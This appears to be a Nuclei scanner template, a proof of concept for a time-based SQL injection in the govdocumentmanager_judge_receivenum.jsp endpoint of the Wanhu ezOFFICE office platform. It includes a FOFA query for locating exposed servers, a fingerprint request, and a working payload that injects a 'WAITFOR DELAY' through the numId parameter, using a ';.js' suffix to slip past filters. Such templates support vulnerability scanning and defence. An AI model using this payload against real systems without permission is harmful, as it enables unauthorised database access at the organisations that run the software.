id: poc-yaml-whir-ezoffice-govdocumentmanager-judge-receivenum-sqli
info:
  name: 万户 ezOFFICE govdocumentmanager_judge_receivenum SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    fingerprint: 万户OA ezoffice
    fofa-query: app="万户网络-ezOFFICE"

variables:
  t1: "{{rand_int(5,10)}}"
  t2: "{{to_number(t1) + 2}}"

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 302
      - type: regex
        regex:
          - "/defaultroot"

  - raw:
      - |
        GET /defaultroot/modules/govoffice/gov_documentmanager/govdocumentmanager_judge_receivenum.jsp;.js?numId=1;WAITFOR+DELAY+'0:0:{{t1}}'-- HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "1"
      - type: dsl
        dsl:
          - duration > to_number(t1)
          - duration < to_number(t2)
